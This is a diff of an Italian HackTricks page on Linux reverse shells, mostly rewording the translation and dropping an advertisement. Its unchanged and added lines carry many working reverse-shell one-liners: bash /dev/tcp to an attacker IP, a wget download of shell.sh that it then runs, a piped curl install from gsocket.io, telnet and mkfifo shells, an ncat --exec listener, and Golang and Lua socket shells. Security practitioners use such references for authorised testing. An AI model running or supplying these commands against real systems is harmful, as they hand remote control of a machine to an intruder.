@@ -7,7 +7,7 @@
 Altri modi per supportare HackTricks:
 
 * Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
+* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
@@ -33,7 +33,7 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Shell sicuro dei simboli
+### Shell sicuro dai simboli
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -57,14 +57,14 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Shell in Avanti
 
-Se incontri una **vulnerabilità RCE** all'interno di un'applicazione web basata su Linux, potresti trovarti in situazioni in cui **diventa difficile ottenere una shell inversa** a causa della presenza di regole Iptables o altri filtri. In tali scenari, considera la creazione di una shell PTY all'interno del sistema compromesso utilizzando i pipe.
+Se incontri una vulnerabilità **RCE** all'interno di un'applicazione web basata su Linux, potrebbero esserci casi in cui **diventa difficile ottenere una shell inversa** a causa della presenza di regole Iptables o di altri filtri. In tali scenari, considera la creazione di una shell PTY all'interno del sistema compromesso utilizzando i pipe.
 
 Puoi trovare il codice su [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
 
 Devi solo modificare:
 
 * L'URL dell'host vulnerabile
-* Il prefisso e il suffisso del tuo payload (se presenti)
+* Il prefisso e il suffisso del tuo payload (se presente)
 * Il modo in cui il payload viene inviato (intestazioni? dati? informazioni extra?)
 
 Quindi, puoi semplicemente **inviare comandi** o addirittura **usare il comando `upgrade`** per ottenere una PTY completa (nota che i pipe vengono letti e scritti con un ritardo approssimativo di 1,3 secondi).
@@ -85,7 +85,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet è un protocollo di rete che consente di stabilire una connessione remota tramite la linea di comando. Può essere utilizzato per accedere e controllare dispositivi remoti su una rete.
+Telnet è un protocollo di rete che consente di stabilire una connessione remota tramite la linea di comando. Può essere utilizzato per accedere e controllare dispositivi remoti.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -145,19 +145,13 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-Trova le vulnerabilità più importanti in modo da poterle risolvere più velocemente. Intruder traccia la tua superficie di attacco, esegue scansioni proattive delle minacce, trova problemi in tutta la tua infrastruttura tecnologica, dalle API alle app web e ai sistemi cloud. [**Provalo gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) oggi.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
+
+Lua è un linguaggio di scripting leggero e potente che può essere incorporato in applicazioni per fornire flessibilità e estensibilità. È ampiamente utilizzato per scripting, sviluppo di giochi e applicazioni embedded. Lua è noto per la sua semplicità, velocità ed efficienza.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -314,9 +308,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 Altri modi per supportare HackTricks:
 
 * Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
+* Ottieni il [**PEASS ufficiale & HackTricks swag**](https://peass.creator-spring.com)
 * Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
-* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Unisciti al** 💬 [**Gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
